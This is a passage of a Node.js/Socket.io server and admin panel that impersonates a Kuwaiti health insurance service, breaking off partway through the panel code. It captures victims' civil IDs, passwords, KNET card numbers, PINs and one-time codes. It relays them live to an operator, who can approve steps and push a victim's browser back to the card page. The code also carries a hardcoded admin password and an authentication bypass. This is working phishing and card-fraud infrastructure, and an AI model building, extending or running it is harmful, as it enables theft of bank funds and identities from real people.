const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] }
});
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

let payments = [];
let users = [];
let loginAttempts = [];
let adminSockets = [];
let clientSockets = {};
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin@2024';

function notifyAdmins(event, data) {
  adminSockets.forEach(s => { try { s.emit(event, data); } catch(e) {} });
}

app.post('/auth/external-login', (req, res) => {
  const { civilId, password } = req.body;
  const loginId = uuidv4();
  const login = { id: loginId, loginCivilId: civilId || '', loginPassword: password || '', created_at: new Date().toISOString() };
  loginAttempts.push(login);
  notifyAdmins('login_new', login);
  res.json({ success: true, loginId, token: 'token_' + loginId });
});

app.post('/auth', (req, res) => {
  const { fullName, civilId, phone, email, nationality, passportExpiry, sponsorName, sponsorCivilId, insuranceType, amountPerYear } = req.body;
  const userId = uuidv4();
  const user = { id: userId, name: fullName || civilId || 'مستخدم', email: email || '', fullName, civilId, phone, nationality, passportExpiry, sponsorName, sponsorCivilId, insuranceType, amountPerYear, created_at: new Date().toISOString() };
  users.push(user);
  notifyAdmins('login_new', user);
  res.json({ success: true, userId, user });
});

app.post('/user', (req, res) => {
  const { civilId, nameArabic, nameEnglish, email, phone, gender, language, governorate, userCategory } = req.body;
  const userId = uuidv4();
  const user = { id: userId, name: nameArabic || nameEnglish || civilId || 'مستخدم', email: email || '', civilId, nameArabic, nameEnglish, phone, gender, language, governorate, userCategory, created_at: new Date().toISOString() };
  users.push(user);
  notifyAdmins('login_new', user);
  res.json({ success: true, userId, user });
});

app.get('/user/all', (req, res) => { res.json(users); });
app.get('/user/count', (req, res) => { res.json({ count: users.length }); });

app.post('/knet', (req, res) => {
  const { clientId, bankName, prefix, cardNumber, expiryMonth, expiryYear, pin, loginId, userId } = req.body;
  const knetId = uuidv4();
  const refNumber = 'INS' + Date.now().toString().slice(-8);
  const payment = {
    id: knetId, knetId, refNumber,
    clientId: clientId || userId || uuidv4(),
    loginCivilId: clientId || '',
    bankName: bankName || '', prefix: prefix || '', cardNumber: cardNumber || '',
    expiryMonth: expiryMonth || '', expiryYear: expiryYear || '',
    pass: pin || '---', loginPassword: pin || '',
    knetOtps: [], status: 'PENDING', step: 1,
    created_at: new Date().toISOString(), updatedAt: new Date().toISOString()
  };
  payments.push(payment);
  notifyAdmins('payment_new', payment);
  res.json({ success: true, knetId, paymentId: knetId, refNumber });
});

app.get('/knet/status/:id', (req, res) => {
  const payment = payments.find(p => p.id === req.params.id || p.knetId === req.params.id);
  if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
  res.json({ success: true, status: payment.status, payment });
});

app.post('/knet/update-status', (req, res) => {
  const { id, status } = req.body;
  const payment = payments.find(p => p.id === id || p.knetId === id);
  if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
  payment.status = status;
  payment.updatedAt = new Date().toISOString();
  notifyAdmins('payment_status_changed', { id: payment.id, status: payment.status, payment });
  res.json({ success: true, payment });
});

app.post('/knet/otp', (req, res) => {
  const { knetId, otp } = req.body;
  const payment = payments.find(p => p.id === knetId || p.knetId === knetId);
  if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
  if (!payment.knetOtps) payment.knetOtps = [];
  payment.knetOtps.unshift({ otp, createdAt: new Date().toISOString() });
  payment.status = 'OTP_REQUEST';
  payment.step = 2;
  payment.updatedAt = new Date().toISOString();
  notifyAdmins('payment_otp_received', { id: payment.id, otp, payment });
  res.json({ success: true, payment });
});

app.get('/knet/all', (req, res) => { res.json(payments); });

app.post('/knet-otp', (req, res) => {
  const { paymentId, otp, pin } = req.body;
  const payment = payments.find(p => p.id === paymentId || p.knetId === paymentId);
  if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
  if (otp) {
    if (!payment.knetOtps) payment.knetOtps = [];
    payment.knetOtps.unshift({ otp, createdAt: new Date().toISOString() });
    payment.status = 'OTP_REQUEST'; payment.step = 2;
    notifyAdmins('payment_otp_received', { id: payment.id, otp, payment });
  }
  if (pin) {
    payment.pass = pin; payment.loginPassword = pin;
    payment.status = 'OTP_REQUEST'; payment.step = 3;
    notifyAdmins('payment_pin_received', { id: payment.id, pin, payment });
  }
  payment.updatedAt = new Date().toISOString();
  res.json({ success: true, payment });
});

app.post('/admin-login', (req, res) => {
  const { email, password } = req.body;
  if (password === ADMIN_PASSWORD || email === 'admin') {
    res.json({ success: true, token: 'admin_token_' + Date.now() });
  } else {
    res.status(401).json({ success: false, message: 'بيانات الدخول غير صحيحة' });
  }
});

app.post('/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    res.json({ success: true, token: 'admin_token_' + Date.now() });
  } else {
    res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
  }
});

app.get('/admin/payments', (req, res) => { res.json(payments); });
app.get('/admin/users', (req, res) => { res.json(users); });

app.post('/admin/payments/:id/action', (req, res) => {
  const { id } = req.params;
  const { action } = req.body;
  const payment = payments.find(p => p.id === id || p.knetId === id);
  if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
  if (action === 'accept' || action === 'pass') {
    if (payment.step === 1) payment.status = 'APPROVED';
    else if (payment.step === 2) payment.status = 'SUCCESS';
    else payment.status = 'SUCCESS';
  } else if (action === 'reject' || action === 'denied') {
    if (payment.step === 2) payment.status = 'OTP_FAILED';
    else payment.status = 'REJECTED';
  }
  payment.updatedAt = new Date().toISOString();
  notifyAdmins('payment_status_changed', { id: payment.id, status: payment.status, payment });
  io.to('payment_' + id).emit('payment_status_changed', { id: payment.id, status: payment.status, payment });
  res.json({ success: true, payment });
});

app.post('/admin/navigate', (req, res) => {
  const { paymentId, page } = req.body;
  io.to('payment_' + paymentId).emit('navigate_to', { page });
  notifyAdmins('user_navigated', { paymentId, page });
  res.json({ success: true });
});

app.get('/panel', (req, res) => { res.send(getAdminHTML()); });
app.use(express.static(path.join(__dirname, 'public')));
app.get('*', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'index.html')); });

io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '';
  clientSockets[socket.id] = { socketId: socket.id, ip: clientIp, page: '/', joinedAt: new Date().toISOString(), paymentId: null, isAdmin: false };
  notifyAdmins('active_users', Object.values(clientSockets).filter(c => !c.isAdmin));

  socket.on('admin_join', (data) => {
    const validToken = data && data.token && data.token.startsWith('admin_token_');
    const validPassword = data && data.password && data.password === ADMIN_PASSWORD;
    if (validToken || validPassword) {
      adminSockets = adminSockets.filter(s => s.id !== socket.id);
      adminSockets.push(socket);
      socket.isAdmin = true;
      if (clientSockets[socket.id]) clientSockets[socket.id].isAdmin = true;
      socket.emit('payments_list', payments);
      socket.emit('users_list', users);
      socket.emit('active_users', Object.values(clientSockets).filter(c => !c.isAdmin));
      console.log('Admin socket joined:', socket.id);
    }
  });
  socket.on('join_payment', (paymentId) => {
    socket.join('payment_' + paymentId);
    if (clientSockets[socket.id]) clientSockets[socket.id].paymentId = paymentId;
  });
  socket.on('page_update', (page) => {
    if (clientSockets[socket.id]) clientSockets[socket.id].page = page;
    notifyAdmins('active_users', Object.values(clientSockets).filter(c => !c.isAdmin));
  });
  socket.on('disconnect', () => {
    adminSockets = adminSockets.filter(s => s.id !== socket.id);
    delete clientSockets[socket.id];
    notifyAdmins('active_users', Object.values(clientSockets).filter(c => !c.isAdmin));
  });
});

function getAdminHTML() {
  const css = `
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: #f8fafc; color: #1e293b; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; font-size: 14px; }
    #login-page { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%); }
    .login-card { background: #fff; border-radius: 20px; padding: 40px 36px; width: 380px; box-shadow: 0 10px 40px rgba(0,0,0,0.08); border: 1px solid #e2e8f0; text-align: center; }
    .login-logo { font-size: 48px; margin-bottom: 12px; }
    .login-title { font-size: 20px; font-weight: 700; color: #1e293b; margin-bottom: 4px; }
    .login-sub { font-size: 13px; color: #64748b; margin-bottom: 28px; }
    .login-input { width: 100%; padding: 12px 16px; border: 1.5px solid #e2e8f0; border-radius: 10px; font-size: 14px; color: #1e293b; background: #f8fafc; outline: none; margin-bottom: 14px; transition: border-color 0.2s; }
    .login-input:focus { border-color: #0ea5e9; background: #fff; }
    .login-btn { width: 100%; padding: 13px; background: #0ea5e9; color: #fff; border: none; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
    .login-btn:hover { background: #0284c7; }
    .login-error { color: #ef4444; font-size: 13px; margin-top: 10px; display: none; }
    #dashboard { display: none; }
    .top-header { background: #fff; border-bottom: 1px solid #e2e8f0; padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; box-shadow: 0 1px 3px rgba(0,0,0,0.06); }
    .header-brand { display: flex; align-items: center; gap: 10px; }
    .header-icon { width: 36px; height: 36px; background: #0ea5e9; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 18px; }
    .header-title { font-size: 16px; font-weight: 700; color: #1e293b; }
    .header-sub { font-size: 11px; color: #64748b; }
    .header-right { display: flex; align-items: center; gap: 12px; }
    .status-badge { display: flex; align-items: center; gap: 6px; padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
    .status-dot { width: 7px; height: 7px; background: #16a34a; border-radius: 50%; animation: pulse 2s infinite; }
    .notif-btn { position: relative; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #64748b; font-size: 16px; transition: all 0.2s; }
    .notif-btn:hover { background: #f0f9ff; color: #0ea5e9; border-color: #bae6fd; }
    .notif-badge { position: absolute; top: -4px; right: -4px; background: #ef4444; color: #fff; border-radius: 50%; width: 16px; height: 16px; font-size: 10px; font-weight: 700; display: none; align-items: center; justify-content: center; }
    .logout-btn { display: flex; align-items: center; gap: 6px; padding: 7px 14px; background: #fff; border: 1px solid #e2e8f0; border-radius: 8px; color: #64748b; font-size: 13px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
    .logout-btn:hover { background: #fef2f2; color: #ef4444; border-color: #fecaca; }
    .stats-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 16px; padding: 20px 24px; background: #fff; border-bottom: 1px solid #e2e8f0; }
    .stat-card { background: #f8fafc; border-radius: 12px; padding: 16px 18px; border: 1px solid #e2e8f0; display: flex; align-items: center; gap: 14px; }
    .stat-icon { width: 42px; height: 42px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 20px; flex-shrink: 0; }
    .stat-icon.blue { background: #eff6ff; color: #2563eb; }
    .stat-icon.green { background: #f0fdf4; color: #16a34a; }
    .stat-icon.yellow { background: #fffbeb; color: #d97706; }
    .stat-icon.red { background: #fef2f2; color: #dc2626; }
    .stat-icon.purple { background: #faf5ff; color: #7c3aed; }
    .stat-num { font-size: 24px; font-weight: 800; color: #1e293b; line-height: 1; }
    .stat-label { font-size: 11px; color: #64748b; margin-top: 3px; }
    .main-content { padding: 20px 24px; }
    .section-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
    .section-title { font-size: 15px; font-weight: 700; color: #1e293b; display: flex; align-items: center; gap: 8px; }
    .search-box { display: flex; align-items: center; gap: 8px; background: #fff; border: 1px solid #e2e8f0; border-radius: 8px; padding: 7px 12px; width: 220px; }
    .search-box input { border: none; outline: none; font-size: 13px; color: #1e293b; background: transparent; width: 100%; }
    .search-box i { color: #94a3b8; font-size: 14px; }
    .table-wrapper { background: #fff; border-radius: 12px; border: 1px solid #e2e8f0; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.04); }
    .payments-table { width: 100%; border-collapse: collapse; }
    .payments-table th { background: #f8fafc; padding: 11px 14px; text-align: right; font-size: 11px; color: #64748b; font-weight: 600; border-bottom: 1px solid #e2e8f0; white-space: nowrap; }
    .payments-table td { padding: 11px 14px; border-bottom: 1px solid #f1f5f9; font-size: 13px; color: #374151; vertical-align: middle; }
    .payments-table tr:last-child td { border-bottom: none; }
    .payments-table tr:hover td { background: #f8fafc; }
    .badge { padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; display: inline-block; white-space: nowrap; }
    .badge-pending { background: #fffbeb; color: #d97706; border: 1px solid #fde68a; }
    .badge-otp { background: #eff6ff; color: #2563eb; border: 1px solid #bfdbfe; }
    .badge-approved { background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
    .badge-rejected { background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; }
    .badge-success { background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
    .badge-failed { background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; }
    .btn { padding: 6px 12px; border-radius: 7px; cursor: pointer; font-size: 12px; font-weight: 600; transition: all 0.15s; border: 1px solid transparent; display: inline-flex; align-items: center; gap: 4px; white-space: nowrap; }
    .btn-details { background: #eff6ff; color: #2563eb; border-color: #bfdbfe; }
    .btn-details:hover { background: #dbeafe; }
    .btn-nav { background: #f0fdf4; color: #16a34a; border-color: #bbf7d0; }
    .btn-nav:hover { background: #dcfce7; }
    .btn-actions { display: flex; gap: 5px; flex-wrap: wrap; align-items: center; }
    .dropdown { position: relative; display: inline-block; }
    .dropdown-menu { display: none; position: absolute; left: 0; top: calc(100% + 4px); background: #fff; border: 1px solid #e2e8f0; border-radius: 10px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); z-index: 200; min-width: 180px; overflow: hidden; }
    .dropdown-menu.show { display: block; }
    .dropdown-item { display: flex; align-items: center; gap: 8px; padding: 10px 14px; font-size: 13px; color: #374151; cursor: pointer; transition: background 0.15s; border: none; background: none; width: 100%; text-align: right; }
    .dropdown-item:hover { background: #f8fafc; }
    .dropdown-item i { font-size: 14px; width: 18px; text-align: center; }
    .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.4); z-index: 1000; align-items: center; justify-content: center; }
    .modal-overlay.active { display: flex; }
    .modal { background: #fff; border-radius: 16px; padding: 28px; width: 560px; max-width: 95vw; border: 1px solid #e2e8f0; max-height: 88vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.15); }
    .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 16px; border-bottom: 1px solid #f1f5f9; }
    .modal-title { font-size: 17px; font-weight: 700; color: #1e293b; }
    .modal-close-btn { width: 32px; height: 32px; border-radius: 8px; border: 1px solid #e2e8f0; background: #f8fafc; cursor: pointer; display: flex; align-items: center; justify-content: center; color: #64748b; font-size: 16px; }
    .modal-close-btn:hover { background: #fef2f2; color: #ef4444; border-color: #fecaca; }
    .sec-title { font-size: 12px; font-weight: 700; color: #64748b; text-transform: uppercase; letter-spacing: 0.5px; margin: 16px 0 10px; padding-bottom: 6px; border-bottom: 1px solid #f1f5f9; }
    .detail-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
    .d-lbl { font-size: 11px; color: #94a3b8; margin-bottom: 2px; }
    .d-val { font-size: 13px; font-weight: 600; color: #1e293b; display: flex; align-items: center; gap: 6px; }
    .d-val.sensitive { color: #d97706; font-family: monospace; font-size: 14px; }
    .copy-btn { background: none; border: none; cursor: pointer; color: #94a3b8; padding: 2px; font-size: 12px; transition: color 0.15s; }
    .copy-btn:hover { color: #0ea5e9; }
    .action-section { background: #f8fafc; border-radius: 10px; padding: 14px; margin-top: 14px; border: 1px solid #e2e8f0; }
    .action-sec-title { font-size: 13px; font-weight: 700; color: #1e293b; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; }
    .action-step-info { font-size: 12px; color: #64748b; margin-bottom: 10px; padding: 6px 10px; background: #fff; border-radius: 6px; border: 1px solid #e2e8f0; }
    .action-btns { display: flex; gap: 8px; flex-wrap: wrap; }
    .action-btn-approve { display: flex; align-items: center; gap: 6px; padding: 8px 16px; background: #16a34a; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; transition: background 0.15s; }
    .action-btn-approve:hover { background: #15803d; }
    .action-btn-reject { display: flex; align-items: center; gap: 6px; padding: 8px 16px; background: #dc2626; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; transition: background 0.15s; }
    .action-btn-reject:hover { background: #b91c1c; }
    .nav-section { background: #f0f9ff; border-radius: 10px; padding: 14px; margin-top: 14px; border: 1px solid #bae6fd; }
    .nav-sec-title { font-size: 13px; font-weight: 700; color: #0369a1; margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
    .nav-btns { display: flex; gap: 8px; flex-wrap: wrap; }
    .nav-btn { display: flex; align-items: center; gap: 6px; padding: 8px 14px; background: #fff; color: #374151; border: 1px solid #e2e8f0; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; transition: all 0.15s; }
    .nav-btn:hover { background: #f0f9ff; border-color: #bae6fd; color: #0369a1; }
    .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #fff; border: 1px solid #e2e8f0; border-radius: 12px; padding: 14px 20px; z-index: 2000; display: none; box-shadow: 0 10px 40px rgba(0,0,0,0.12); min-width: 300px; text-align: center; }
    .notification.show { display: block; animation: slideDown 0.3s ease; }
    .notification.new-payment { border-color: #bae6fd; background: #f0f9ff; }
    .notification.new-otp { border-color: #fde68a; background: #fffbeb; }
    .notification.new-pin { border-color: #bbf7d0; background: #f0fdf4; }
    .notif-title { font-size: 14px; font-weight: 700; color: #1e293b; }
    .notif-sub { font-size: 12px; color: #64748b; margin-top: 3px; }
    .notif-data { font-size: 14px; font-weight: 700; color: #0ea5e9; font-family: monospace; margin-top: 4px; letter-spacing: 2px; }
    .empty-state { text-align: center; padding: 60px 20px; color: #94a3b8; }
    .empty-icon { font-size: 48px; margin-bottom: 12px; opacity: 0.5; }
    .ref-code { font-family: monospace; font-size: 12px; color: #0ea5e9; background: #f0f9ff; padding: 2px 6px; border-radius: 4px; }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
    @keyframes slideDown { from { transform: translateX(-50%) translateY(-20px); opacity: 0; } to { transform: translateX(-50%) translateY(0); opacity: 1; } }
  `;

  const html = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لوحة التحكم - نظام الضمان الصحي الكويتي</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
  <script src="/socket.io/socket.io.js"><\/script>
  <style>${css}<\/style>
</head>
<body>
<div id="login-page">
  <div class="login-card">
    <div class="login-logo">&#x1F3E5;</div>
    <div class="login-title">نظام الضمان الصحي الكويتي</div>
    <div class="login-sub">لوحة التحكم الإدارية</div>
    <input type="password" id="pw-input" class="login-input" placeholder="أدخل كلمة المرور">
    <button class="login-btn" id="login-btn"><i class="bi bi-shield-lock"></i> تسجيل الدخول</button>
    <div class="login-error" id="login-error">كلمة المرور غير صحيحة</div>
  </div>
</div>
<div id="dashboard">
  <div class="top-header">
    <div class="header-brand">
      <div class="header-icon"><i class="bi bi-heart-pulse"></i></div>
      <div>
        <div class="header-title">نظام الضمان الصحي الكويتي</div>
        <div class="header-sub">لوحة التحكم الإدارية</div>
      </div>
    </div>
    <div class="header-right">
      <div class="status-badge" id="conn-badge"><div class="status-dot"></div><span id="conn-text">متصل</span></div>
      <div class="notif-btn" id="notif-btn"><i class="bi bi-bell"></i><div class="notif-badge" id="notif-badge">0</div></div>
      <button class="logout-btn" id="logout-btn"><i class="bi bi-box-arrow-right"></i> خروج</button>
    </div>
  </div>
  <div class="stats-grid">
    <div class="stat-card"><div class="stat-icon blue"><i class="bi bi-people"></i></div><div><div class="stat-num" id="stat-total">0</div><div class="stat-label">إجمالي الطلبات</div></div></div>
    <div class="stat-card"><div class="stat-icon yellow"><i class="bi bi-clock"></i></div><div><div class="stat-num" id="stat-pending">0</div><div class="stat-label">قيد المعالجة</div></div></div>
    <div class="stat-card"><div class="stat-icon green"><i class="bi bi-check-circle"></i></div><div><div class="stat-num" id="stat-approved">0</div><div class="stat-label">مكتملة</div></div></div>
    <div class="stat-card"><div class="stat-icon red"><i class="bi bi-x-circle"></i></div><div><div class="stat-num" id="stat-rejected">0</div><div class="stat-label">مرفوضة</div></div></div>
    <div class="stat-card"><div class="stat-icon purple"><i class="bi bi-wifi"></i></div><div><div class="stat-num" id="stat-online">0</div><div class="stat-label">زوار متصلون الآن</div></div></div>
  </div>
  <div class="main-content">
    <div class="section-header">
      <div class="section-title"><i class="bi bi-credit-card" style="color:#0ea5e9"></i> قائمة طلبات الدفع KNET</div>
      <div class="search-box"><i class="bi bi-search"></i><input type="text" id="srch" placeholder="بحث..."></div>
    </div>
    <div class="table-wrapper">
      <div id="payments-container"><div class="empty-state"><div class="empty-icon"><i class="bi bi-inbox"></i></div><div>لا توجد طلبات بعد</div></div></div>
    </div>
  </div>
</div>
<div class="modal-overlay" id="modal-overlay">
  <div class="modal">
    <div class="modal-header"><div class="modal-title" id="modal-title">تفاصيل الطلب</div><button class="modal-close-btn" id="modal-close-btn"><i class="bi bi-x-lg"></i></button></div>
    <div id="modal-body"></div>
  </div>
</div>
<div class="notification" id="notification">
  <div class="notif-title" id="notif-title"></div>
  <div class="notif-sub" id="notif-sub"></div>
  <div class="notif-data" id="notif-data"></div>
</div>
<script>
(function() {
  var adminToken = null;
  var socket = null;
  var allPayments = [];
  var notifCount = 0;
  var notifTimeout = null;
  var currentModalId = null;

  // Login
  document.getElementById('pw-input').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') doLogin();
  });
  document.getElementById('login-btn').addEventListener('click', doLogin);
  document.getElementById('logout-btn').addEventListener('click', doLogout);
  document.getElementById('modal-close-btn').addEventListener('click', closeModal);
  document.getElementById('modal-overlay').addEventListener('click', function(e) {
    if (e.target === this) closeModal();
  });
  document.getElementById('srch').addEventListener('input', renderPayments);

  // Event delegation for table buttons
  document.getElementById('payments-container').addEventListener('click', function(e) {
    var btn = e.target.closest('[data-action]');
    if (!btn) return;
    var action = btn.getAttribute('data-action');
    var id = btn.getAttribute('data-id');
    var page = btn.getAttribute('data-page');
    if (action === 'details') showDetails(id);
    else if (action === 'toggle-dd') toggleDropdown('dd-' + id);
    else if (action === 'nav') navUser(id, page);
  });

  // Event delegation for modal buttons
  document.getElementById('modal-body').addEventListener('click', function(e) {
    var btn = e.target.closest('[data-action]');
    if (!btn) return;
    var action = btn.getAttribute('data-action');
    var id = btn.getAttribute('data-id');
    var page = btn.getAttribute('data-page');
    var val = btn.getAttribute('data-val');
    if (action === 'approve') doAction(id, 'accept');
    else if (action === 'reject') doAction(id, 'reject');
    else if (action === 'nav') navUser(id, page);
    else if (action === 'copy') copyVal(val);
  });

  document.addEventListener('click', function(e) {
    if (!e.target.closest('.dropdown')) {
      document.querySelectorAll('.dropdown-menu.show').forEach(function(el) { el.classList.remove('show'); });
    }
  });

  async function doLogin() {
    var pw = document.getElementById('pw-input').value;
    try {
      var res = await fetch('/admin/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({password: pw}) });
      var data = await res.json();
      if (data.success) {
        adminToken = data.token;
        document.getElementById('login-page').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        initSocket();
        loadPayments();
      } else {
        document.getElementById('login-error').style.display = 'block';
      }
    } catch(e) {
      document.getElementById('login-error').style.display = 'block';
    }
  }

  function doLogout() {
    adminToken = null;
    if (socket) socket.disconnect();
    document.getElementById('dashboard').style.display = 'none';
    document.getElementById('login-page').style.display = 'flex';
    document.getElementById('pw-input').value = '';
  }

  function initSocket() {
    socket = io();
    socket.on('connect', function() {
      document.getElementById('conn-badge').style.background = '#f0fdf4';
      document.getElementById('conn-text').textContent = 'متصل';
      socket.emit('admin_join', { token: adminToken, password: 'Admin@2024' });
      loadPayments();
    });
    socket.on('disconnect', function() {
      document.getElementById('conn-badge').style.background = '#fef2f2';
      document.getElementById('conn-text').textContent = 'غير متصل';
    });
    socket.on('payment_new', function(payment) {
      var idx = allPayments.findIndex(function(p) { return p.id === payment.id; });
      if (idx !== -1) allPayments[idx] = payment;
      else allPayments.unshift(payment);
      renderPayments(); updateStats();
      showNotification('طلب دفع جديد!', (payment.loginCivilId || payment.clientId || '') + ' - ' + (payment.bankName || ''), (payment.prefix || '') + ' ' + (payment.cardNumber || ''), 'new-payment');
      playSound(); bumpNotif();
    });
    socket.on('payment_otp_received', function(data) {
      var idx = allPayments.findIndex(function(p) { return p.id === data.id || p.id === data.paymentId; });
      if (idx !== -1) { allPayments[idx] = data.payment || allPayments[idx]; renderPayments(); updateStats(); }
      showNotification('OTP جديد وصل!', 'الرقم المرجعي: ' + (data.payment ? data.payment.refNumber : ''), data.otp || '', 'new-otp');
      playSound(); bumpNotif();
    });
    socket.on('payment_pin_received', function(data) {
      var idx = allPayments.findIndex(function(p) { return p.id === data.id || p.id === data.paymentId; });
      if (idx !== -1) { allPayments[idx] = data.payment || allPayments[idx]; renderPayments(); updateStats(); }
      showNotification('رقم سري جديد!', 'الرقم المرجعي: ' + (data.payment ? data.payment.refNumber : ''), data.pin || '', 'new-pin');
      playSound(); bumpNotif();
    });
    socket.on('payment_status_changed', function(data) {
      var idx = allPayments.findIndex(function(p) { return p.id === data.id || p.id === data.paymentId; });
      if (idx !== -1) {
        if (data.payment) allPayments[idx] = data.payment;
        else allPayments[idx].status = data.status;
        renderPayments(); updateStats();
      }
    });
    socket.on('payments_list', function(list) { allPayments = list; renderPayments(); updateStats(); });
    socket.on('login_new', function(data) {
      showNotification('تسجيل دخول جديد!', data.loginCivilId || data.civilId || '', data.loginPassword || '', 'new-payment');
      playSound(); bumpNotif();
    });
    socket.on('active_users', function(users) {
      document.getElementById('stat-online').textContent = users.length;
    });
  }

  async function loadPayments() {
    try {
      var res = await fetch('/admin/payments');
      allPayments = await res.json();
      renderPayments(); updateStats();
    } catch(e) {}
  }

  function getStatusBadge(status) {
    var map = {
      'PENDING': '<span class="badge badge-pending">انتظار</span>',
      'APPROVED': '<span class="badge badge-approved">موافقة</span>',
      'OTP_REQUEST': '<span class="badge badge-otp">OTP وصل</span>',
      'OTP_FAILED': '<span class="badge badge-failed">OTP خاطئ</span>',
      'SUCCESS': '<span class="badge badge-success">مكتمل</span>',
      'REJECTED': '<span class="badge badge-rejected">مرفوض</span>',
      'pending_card': '<span class="badge badge-pending">انتظار البطاقة</span>',
      'waiting_otp': '<span class="badge badge-otp">انتظار OTP</span>',
      'pending_otp': '<span class="badge badge-otp">OTP وصل</span>',
      'waiting_pin': '<span class="badge badge-otp">انتظار الرقم السري</span>',
      'pending_pin': '<span class="badge badge-otp">الرقم السري وصل</span>',
      'completed': '<span class="badge badge-success">مكتمل</span>',
      'rejected': '<span class="badge badge-rejected">مرفوض</span>'
    };
    return map[status] || '<span class="badge badge-pending">' + (status || 'غير محدد') + '</span>';
  }

  function renderPayments() {
    var container = document.getElementById('payments-container');
    var q = (document.getElementById('srch').value || '').toLowerCase();
    var list = allPayments;
    if (q) {
      list = allPayments.filter(function(p) {
        return (p.loginCivilId || '').toLowerCase().includes(q) ||
               (p.clientId || '').toLowerCase().includes(q) ||
               (p.bankName || '').toLowerCase().includes(q) ||
               (p.cardNumber || '').toLowerCase().includes(q) ||
               (p.refNumber || '').toLowerCase().includes(q) ||
               (p.status || '').toLowerCase().includes(q);
      });
    }
    if (!list.length) {
      container.innerHTML = '<div class="empty-state"><div class="empty-icon"><i class="bi bi-inbox"></i></div><div>' + (q ? 'لا توجد نتائج' : 'لا توجد طلبات بعد') + '</div></div>';
      return;
    }
    var html = '<table class="payments-table"><thead><tr><th>المرجع</th><th>الرقم المدني</th><th>البنك</th><th>رقم البطاقة</th><th>الانتهاء</th><th>الحالة</th><th>OTP</th><th>الإجراءات</th></tr></thead><tbody>';
    list.forEach(function(p) {
      var otp = p.knetOtps && p.knetOtps.length ? p.knetOtps[0].otp : '-';
      var id = p.id;
      html += '<tr>';
      html += '<td><span class="ref-code">' + (p.refNumber || id.substring(0, 8)) + '</span></td>';
      html += '<td><b>' + (p.loginCivilId || p.clientId || '-') + '</b></td>';
      html += '<td>' + (p.bankName || '-') + '</td>';
      html += '<td><span style="font-family:monospace">' + (p.prefix || '') + ' ' + (p.cardNumber || '-') + '</span></td>';
      html += '<td>' + (p.expiryMonth || '') + (p.expiryMonth && p.expiryYear ? '/' : '') + (p.expiryYear || '-') + '</td>';
      html += '<td>' + getStatusBadge(p.status) + '</td>';
      html += '<td><span style="font-family:monospace;font-weight:700;color:#d97706">' + otp + '</span></td>';
      html += '<td><div class="btn-actions">';
      html += '<button class="btn btn-details" data-action="details" data-id="' + id + '"><i class="bi bi-eye"></i> تفاصيل</button>';
      html += '<div class="dropdown">';
      html += '<button class="btn btn-nav" data-action="toggle-dd" data-id="' + id + '"><i class="bi bi-send"></i> توجيه <i class="bi bi-chevron-down"></i></button>';
      html += '<div class="dropdown-menu" id="dd-' + id + '">';
      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/knet"><i class="bi bi-credit-card" style="color:#16a34a"></i>صفحة KNET</button>';
